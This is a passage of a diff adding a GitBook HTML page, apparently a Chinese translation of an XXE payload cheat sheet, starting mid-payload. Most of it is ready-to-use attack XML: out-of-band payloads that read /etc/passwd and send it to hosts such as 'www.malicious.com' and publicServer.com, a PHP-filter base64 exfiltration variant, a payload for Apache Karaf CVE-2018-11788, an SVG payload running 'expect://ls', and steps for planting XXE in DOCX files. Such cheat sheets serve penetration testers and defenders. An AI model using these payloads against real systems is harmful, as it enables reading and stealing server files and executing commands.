+i: &amp;i [*h,*h,*h,*h,*h,*h,*h,*h,*h]
+</code></pre>
+<h2 id="blind-xxe---out-of-band">Blind XXE - Out of Band</h2>
+<p>&#x6709;&#x65F6;&#xFF0C;&#x60A8;&#x4E0D;&#x4F1A;&#x5728;&#x9875;&#x9762;&#x4E2D;&#x8F93;&#x51FA;&#x7ED3;&#x679C;&#xFF0C;&#x4F46;&#x4ECD;&#x7136;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x5E26;&#x5916;&#x653B;&#x51FB;&#x63D0;&#x53D6;&#x6570;&#x636E;&#x3002;</p>
+<h3 id="blind-xxe">Blind XXE</h3>
+<p>&#x6D4B;&#x8BD5;&#x76F2;XXE&#x7684;&#x6700;&#x7B80;&#x5355;&#x65B9;&#x6CD5;&#x662F;&#x5C1D;&#x8BD5;&#x52A0;&#x8F7D;&#x8FDC;&#x7A0B;&#x8D44;&#x6E90;&#xFF0C;&#x5982;Burp&#x534F;&#x4F5C;&#x5668;&#x3002;</p>
+<pre><code class="lang-xml"><span class="php"><span class="hljs-meta">&lt;?</span>xml version=<span class="hljs-string">&quot;1.0&quot;</span> <span class="hljs-meta">?&gt;</span></span>
+<span class="hljs-meta">&lt;!DOCTYPE root [
+&lt;!ENTITY % ext SYSTEM &quot;http://UNIQUE_ID_FOR_BURP_COLLABORATOR.burpcollaborator.net/x&quot;&gt; %ext;
+]&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">r</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">r</span>&gt;</span>
+</code></pre>
+<p>&#x5C06;<code>/etc/passwd</code>&#x7684;&#x5185;&#x5BB9;&#x53D1;&#x9001;&#x5230;&#x201C;www.malitive.com&#x201D;&#xFF0C;&#x60A8;&#x53EF;&#x80FD;&#x53EA;&#x6536;&#x5230;&#x7B2C;&#x4E00;&#x884C;&#x3002;</p>
+<pre><code class="lang-xml"><span class="php"><span class="hljs-meta">&lt;?</span>xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;ISO-8859-1&quot;</span><span class="hljs-meta">?&gt;</span></span>
+<span class="hljs-meta">&lt;!DOCTYPE foo [
+&lt;!ELEMENT foo ANY &gt;
+&lt;!ENTITY % xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;
+&lt;!ENTITY callhome SYSTEM &quot;www.malicious.com/?%xxe;&quot;&gt;
+]
+&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">foo</span>&gt;</span>&amp;callhome;<span class="hljs-tag">&lt;/<span class="hljs-name">foo</span>&gt;</span>
+</code></pre>
+<h3 id="xxe-oob-attack-yunusov-2013">XXE OOB Attack (Yunusov, 2013)</h3>
+<pre><code class="lang-xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
+&lt;!DOCTYPE data SYSTEM &quot;http://publicServer.com/parameterEntity_oob.dtd&quot;&gt;
+&lt;data&gt;&amp;send;&lt;/data&gt;
+
+File stored on http://publicServer.com/parameterEntity_oob.dtd
+&lt;!ENTITY % file SYSTEM &quot;file:///sys/power/image_size&quot;&gt;
+&lt;!ENTITY % all &quot;&lt;!ENTITY send SYSTEM &apos;http://publicServer.com/?%file;&apos;&gt;&quot;&gt;
+%all;
+</code></pre>
+<h3 id="xxe-oob-with-dtd-and-php-filter">XXE OOB with DTD and PHP filter</h3>
+<pre><code class="lang-xml">&lt;?xml version=&quot;1.0&quot; ?&gt;
+&lt;!DOCTYPE r [
+&lt;!ELEMENT r ANY &gt;
+&lt;!ENTITY % sp SYSTEM &quot;http://127.0.0.1/dtd.xml&quot;&gt;
+%sp;
+%param1;
+]&gt;
+&lt;r&gt;&amp;exfil;&lt;/r&gt;
+
+File stored on http://127.0.0.1/dtd.xml
+&lt;!ENTITY % data SYSTEM &quot;php://filter/convert.base64-encode/resource=/etc/passwd&quot;&gt;
+&lt;!ENTITY % param1 &quot;&lt;!ENTITY exfil SYSTEM &apos;http://127.0.0.1/dtd.xml?%data;&apos;&gt;&quot;&gt;
+</code></pre>
+<h3 id="xxe-oob-with-apache-karaf">XXE OOB with Apache Karaf</h3>
+<p>CVE-2018-11788 affecting versions:</p>
+<ul>
+<li>Apache Karaf &lt;= 4.2.1</li>
+<li>Apache Karaf &lt;= 4.1.6</li>
+</ul>
+<pre><code class="lang-xml"><span class="php"><span class="hljs-meta">&lt;?</span>xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span><span class="hljs-meta">?&gt;</span></span>
+<span class="hljs-meta">&lt;!DOCTYPE doc [&lt;!ENTITY % dtd SYSTEM &quot;http://27av6zyg33g8q8xu338uvhnsc.canarytokens.com&quot;&gt; %dtd;]
+&lt;features name=&quot;my-features&quot; xmlns=&quot;http://karaf.apache.org/xmlns/features/v1.3.0&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;
+        xsi:schemaLocation=&quot;http://karaf.apache.org/xmlns/features/v1.3.0 http://karaf.apache.org/xmlns/features/v1.3.0&quot;&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">feature</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;deployer&quot;</span> <span class="hljs-attr">version</span>=<span class="hljs-string">&quot;2.0&quot;</span> <span class="hljs-attr">install</span>=<span class="hljs-string">&quot;auto&quot;</span>&gt;</span>
+    <span class="hljs-tag">&lt;/<span class="hljs-name">feature</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">features</span>&gt;</span>
+</code></pre>
+<p>&#x5C06;XML&#x6587;&#x4EF6;&#x53D1;&#x9001;&#x5230;&#x201C;deploy&#x201D;&#x6587;&#x4EF6;&#x5939;&#x3002;</p>
+<p>&#x53C2;&#x8003;&#x6587;&#x732E;<a href="https://github.com/brianwrf/CVE-2018-11788" target="_blank">brianwrf/CVE-2018-11788</a></p>
+<h2 id="xxe-in-exotic-files">XXE in exotic files</h2>
+<h3 id="xxe-inside-svg">XXE inside SVG</h3>
+<pre><code class="lang-xml"><span class="hljs-tag">&lt;<span class="hljs-name">svg</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.w3.org/2000/svg&quot;</span> <span class="hljs-attr">xmlns:xlink</span>=<span class="hljs-string">&quot;http://www.w3.org/1999/xlink&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;300&quot;</span> <span class="hljs-attr">version</span>=<span class="hljs-string">&quot;1.1&quot;</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;200&quot;</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">image</span> <span class="hljs-attr">xlink:href</span>=<span class="hljs-string">&quot;expect://ls&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">image</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">svg</span>&gt;</span>
+</code></pre>
+<h3 id="xxe-inside-soap">XXE inside SOAP</h3>
+<pre><code class="lang-xml"><span class="hljs-tag">&lt;<span class="hljs-name">soap:Body</span>&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">foo</span>&gt;</span>
+    &lt;![CDATA[&lt;!DOCTYPE doc [&lt;!ENTITY % dtd SYSTEM &quot;http://x.x.x.x:22/&quot;&gt; %dtd;]&gt;&lt;xxx/&gt;]]&gt;
+  <span class="hljs-tag">&lt;/<span class="hljs-name">foo</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">soap:Body</span>&gt;</span>
+</code></pre>
+<h3 id="xxe-inside-docx-file">XXE inside DOCX file</h3>
+<p>&#x6253;&#x5F00;&#x7684;XML&#x6587;&#x4EF6;&#x7684;&#x683C;&#x5F0F;&#xFF08;&#x5728;&#x4EFB;&#x4F55;.XML&#x6587;&#x4EF6;&#x4E2D;&#x63D2;&#x5165;&#x8D1F;&#x8F7D;&#xFF09;&#xFF1A;</p>
+<ul>
+<li>/_rels/.rels</li>
+<li>[Content_Types].xml</li>
+<li>Default Main Document Part<ul>
+<li>/word/document.xml</li>
+<li>/ppt/presentation.xml</li>
+<li>/xl/workbook.xml</li>
+</ul>
+</li>
+</ul>
+<p>&#x7136;&#x540E;&#x66F4;&#x65B0;&#x6587;&#x4EF6; <code>zip -u xxe.docx [Content_Types].xml</code></p>
+<p>Tool : <a href="https://github.com/BuffaloWill/oxml_xxe" target="_blank">https://github.com/BuffaloWill/oxml_xxe</a></p>
+<pre><code class="lang-xml">DOCX/XLSX/PPTX
+ODT/ODG/ODP/ODS
+SVG
+XML
+PDF (experimental)
+JPG (experimental)
+GIF (experimental)
+</code></pre>
+<h2 id="references">References</h2>
+<ul>
+<li><a href="https://www.owasp.org/index.php/XML_External_Entity_(XXE" target="_blank">XML External Entity (XXE) Processing - OWASP</a>_Processing)</li>
+<li><a href="http://web-in-security.blogspot.fr/2014/11/detecting-and-exploiting-xxe-in-saml.html" target="_blank">Detecting and exploiting XXE in SAML Interfaces - Von Christian Mainka</a></li>
+<li><a href="https://gist.github.com/staaldraad/01415b990939494879b4" target="_blank">staaldraad - XXE payloads</a></li>
+<li><a href="https://gist.github.com/mgeeky/4f726d3b374f0a34267d4f19c9004870" target="_blank">mgeeky - XML attacks</a></li>
+<li><a href="https://www.blackhat.com/docs/webcast/11192015-exploiting-xml-entity-vulnerabilities-in-file-parsing-functionality.pdf" target="_blank">Exploiting xxe in file upload functionality - BLACKHAT WEBCAST - 11/19/15 Will Vandevanter - @<em>will_is</em></a></li>
+<li><a href="http://en.hackdig.com/08/28075.htm" target="_blank">XXE ALL THE THINGS!!! (including Apple iOS&apos;s Office Viewer)</a></li>
+<li><a href="http://agrawalsmart7.com/2018/11/10/Understanding-XXE-from-Basic-to-Blind.html" target="_blank">Understanding Xxe From Basic To Blind - 10/11/2018 - Utkarsh Agrawal</a></li>
+<li><a href="https://www.honoki.net/2018/12/from-blind-xxe-to-root-level-file-read-access/" target="_blank">From blind XXE to root-level file read access - December 12, 2018 by Pieter Hiele</a></li>
+<li><a href="https://blog.detectify.com/2014/04/11/how-we-got-read-access-on-googles-production-servers/" target="_blank">How we got read access on Google&#x2019;s production servers</a> by  detectify</li>
+<li><a href="http://nerdint.blogspot.hk/2016/08/blind-oob-xxe-at-uber-26-domains-hacked.html" target="_blank">Blind OOB XXE At UBER 26+ Domains Hacked</a> by Raghav Bisht</li>
+<li><a href="https://seanmelia.files.wordpress.com/2016/01/out-of-band-xml-external-entity-injection-via-saml-redacted.pdf" target="_blank">XXE through SAML</a></li>
+<li><a href="https://httpsonly.blogspot.hk/2017/01/0day-writeup-xxe-in-ubercom.html" target="_blank">XXE in Uber to read local files</a></li>
+<li><a href="http://esoln.net/Research/2017/03/30/xxe-in-lithium-community-platform/" target="_blank">XXE by SVG in community.lithium.com</a></li>
+<li><a href="https://quanyang.github.io/x-ctf-finals-2016-john-slick-web-25/" target="_blank">XXE inside SVG</a></li>
+<li><a href="https://phonexicum.github.io/infosec/xxe.html" target="_blank">Pentest XXE - @phonexicum</a></li>
+</ul>
+
+                                
+                                </section>
+                            
+    </div>
+    <div class="search-results">
+        <div class="has-results">
+            
+            <h1 class="search-results-title"><span class='search-results-count'></span> results matching "<span class='search-query'></span>"</h1>
+            <ul class="search-results-list"></ul>
+            
+        </div>
+        <div class="no-results">
+            
+            <h1 class="search-results-title">No results matching "<span class='search-query'></span>"</h1>
+            
+        </div>
+    </div>
+</div>
+
+                        </div>
+                    </div>
+                
+            </div>
+
+            
+                
+                <a href="../SAML注入/" class="navigation navigation-prev " aria-label="Previous page: SAML注入">
+                    <i class="fa fa-angle-left"></i>
+                </a>
+                
+                
+                <a href="../模板注入-SSTI/" class="navigation navigation-next " aria-label="Next page: 模板注入-SSTI">
+                    <i class="fa fa-angle-right"></i>
+                </a>
+                
+            
+        
+    </div>
+
+    <script>
+        var gitbook = gitbook || [];
+        gitbook.push(function() {
+            gitbook.page.hasChanged({"page":{"title":"XML实体注入漏洞-XXE","level":"1.5.8","depth":2,"next":{"title":"模板注入-SSTI","level":"1.5.9","depth":2,"path":"模板注入-SSTI/README.md","ref":"模板注入-SSTI/README.md","articles":[]},"previous":{"title":"SAML注入","level":"1.5.7","depth":2,"path":"SAML注入/README.md","ref":"SAML注入/README.md","articles":[]},"dir":"ltr"},"config":{"gitbook":"*","theme":"default","variables":{},"plugins":["livereload"],"pluginsConfig":{"livereload":{},"highlight":{},"search":{},"lunr":{"maxIndexSize":1000000,"ignoreSpecialCharacters":false},"sharing":{"facebook":true,"twitter":true,"google":false,"weibo":false,"instapaper":false,"vk":false,"all":["facebook","google","twitter","weibo","instapaper"]},"fontsettings":{"theme":"white","family":"sans","size":2},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"}},"file":{"path":"XML实体注入漏洞-XXE/README.md","mtime":"2020-03-05T02:37:27.636Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2020-03-07T13:33:06.131Z"},"basePath":"..","book":{"language":""}});
+        });
+    </script>
+</div>
+
+        
+    <script src="../gitbook/gitbook.js"></script>
+    <script src="../gitbook/theme.js"></script>
+    
+        
+        <script src="../gitbook/gitbook-plugin-livereload/plugin.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-search/search-engine.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-search/search.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-lunr/lunr.min.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-lunr/search-lunr.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-sharing/buttons.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-fontsettings/fontsettings.js"></script>
+        
+    
+
+    </body>
+</html>
+
